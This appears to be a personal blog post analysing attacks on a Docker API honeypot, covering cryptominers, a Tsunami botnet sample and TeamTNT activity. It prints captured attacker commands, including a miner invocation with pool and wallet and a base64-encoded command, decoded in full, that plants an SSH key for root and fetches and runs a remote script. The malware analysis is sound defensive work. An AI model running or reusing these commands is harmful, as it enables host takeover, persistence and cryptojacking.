---
title: "Honeypot"
date: 2022-06-23T19:50:38-04:00
draft: false
---

# Honeypot

[https://sysdig.com/blog/triaging-malicious-docker-container/](https://sysdig.com/blog/triaging-malicious-docker-container/)

[https://www.intezer.com/blog/malware-analysis/how-to-make-malware-honeypot/](https://www.intezer.com/blog/malware-analysis/how-to-make-malware-honeypot/)

[https://medium.com/@riccardo.ancarani94/attacking-docker-exposed-api-3e01ffc3c124](https://medium.com/@riccardo.ancarani94/attacking-docker-exposed-api-3e01ffc3c124)

[https://hub.docker.com/_/alpine](https://hub.docker.com/_/alpine)

EC2 Instance running Ubuntu Server 18.04 w/ Docker running an Alpine Linux container.

- Port 22 is locked to my IP only
- Port 2375 is exposed which is the Docker API. Useful for tools like Portainer.

Got an alert for a masscan command searching for port 2375. Another alert was triggered for 2376 as some APIs expose this instead of 2375.

![Untitled](/Honeypot/Untitled.png)

Activity between 10pm 2/9 and 04:32 2/10

![alerts.JPG](/Honeypot/alerts.jpg)

I found that one of these alerts dealt with a new docker container “risible_oxter.” More on that later but for context, I only installed an Alpine container. The others weren’t a concern as they immediately exited and eventually removed.

![Capture.JPG](/Honeypot/Capture.jpg)

### Cetus

Cetus is an XMR miner which is the culprit as to what created the risible_oxter container.

The `containerd-shim-run-v2` command is a shim API for runtime. After downloading, they use `portainer` to run the risible_oxter container.

Execution Time: 10 Feb 22 | 04:24

SHA256: b49a3f3cb4c70014e2c35c880d47bc475584b87b7dfcfa6d7341d42a16ebe443

Process Tree:

```bash
/sbin/init
	/usr/bin/containerd-shim-runc-v2 -namespace moby -id 8f01c6e6c82aa76d2eb7a4671bcea039e5a01b89bd0edff8ce1acf3146abd300 -address /run/containerd/containerd.sock
		/bin/bash
			/usr/bin/portainer risible_oxter
```

- Container was executed at 04:18
- Related sample to TeamTNT

New activity while writing this. Now defining an actual pool address with additional parameters. The utmp.log showed mining activity and hardware info. 

```bash
docker-cache -B --donate-level 1 -o pool.minexmr.com:443 -u 85X7JcgPpwQdZXaK2TKJb8baQAXc3zBsnW7JuY7MLi9VYSamf4bFwa7SEAK9Hgp2P53npV19w1zuaK5bft5m2NN71CmNLoh -k --tls -t 1 --rig-id risible_oxter -l /var/log/utmp.log
```

- Connects to 94[.]130[.]164[.]163:443

### Generic Malware

Execution Time: 09 Feb 22 | 22:06

SHA256: 0d95f767c5f828695761e199b6e0b9fe62ace2902221540a33d331859648e761

Process Tree:

```bash
/sbin/init
	/var/tmp/.copydie/[kswapd0] --config=/var/tmp/.copydie/[kswapd0].pid
```

- 

![Malicious file opened. Another Monero coinminer](/Honeypot/Untitled%201.png)

Malicious file opened. Another Monero coinminer

`cat` output of `/var/tmp/.copydie/[kswapd0].pid`

![Untitled](/Honeypot/Untitled%202.png)

- `[kswapd0]` is a stripped executable so I couldn’t view strings.

![Untitled](/Honeypot/Untitled%203.png)

### Tsunami

Tsunami was interesting because it only launched a single executable `bioset`. After looking through the file, I noticed some strings that were of interest, Ziggy Startux and a lot of config strings. 

Execution Time: 09 Feb 22 | 22:06

SHA256: 6574b93062974e287a65798dca6f6efd2bc8f8e376baa6efa69ddfc719acf8d9

Process Tree:

```bash
/sbin/init
	/bioset
```

![Untitled](/Honeypot/Untitled%204.png)

Turns out it’s a TeamTNT botnet.

[TeamTNT Builds Botnet from Chinese Cloud Servers - Lacework](https://www.lacework.com/blog/teamtnt-builds-botnet-from-chinese-cloud-servers/)

Network Connections

| Local Address | Foreign Address |
| --- | --- |
| 172[.]31[.]94[.]144:56862 | 159[.]75[.]18[.]13:3667 |

Some further attribution tying the Tsunami sample to TeamTNT based on similar strings. 

![Untitled](/Honeypot/Untitled%205.png)

### TeamTNT

TeamTNT first sets up their own ssh key and moves the private key to `/tmp/TeamTNT`

![Untitled](/Honeypot/Untitled%206.png)

![Untitled](/Honeypot/Untitled%207.png)

Initially uses busybox to launch a base64 encoded command and with that copies their public key to the `authorized_keys` folder for persistence. With an active connection, I believe this is how the Ziggy Startux botnet gets installed. 

```bash
/bin/busybox

`chroot /host bash -c echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA== | base64 -d | bash`
```

Decoded output

```bash
ssh-keygen -N "" -f /tmp/TeamTNT
mkdir -p /root/.ssh
chattr -R -ia /root/.ssh/ 2>/dev/null; tntrecht -R -ia /root/.ssh/ 2>/dev/null; ichdarf -R -ia /root/.ssh/ 2>/dev/null
cat /tmp/TeamTNT.pub >> /root/.ssh/authorized_keys
cat /tmp/TeamTNT.pub > /root/.ssh/authorized_keys2
rm -f /tmp/TeamTNT.pub

ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i /tmp/TeamTNT root@127.0.0.1 "(curl http://104[.]192[.]82[.]138/s3f1015/b/a.sh||cd1 http://104[.]192[.]82[.]138/s3f1015/b/a.sh||wget -q -O- http://104[.]192[.]82[.]138/s3f1015/b/a.sh||wd1 -q -O- http://104[.]192[.]82[.]138/s3f1015/b/a.sh)|bash"
```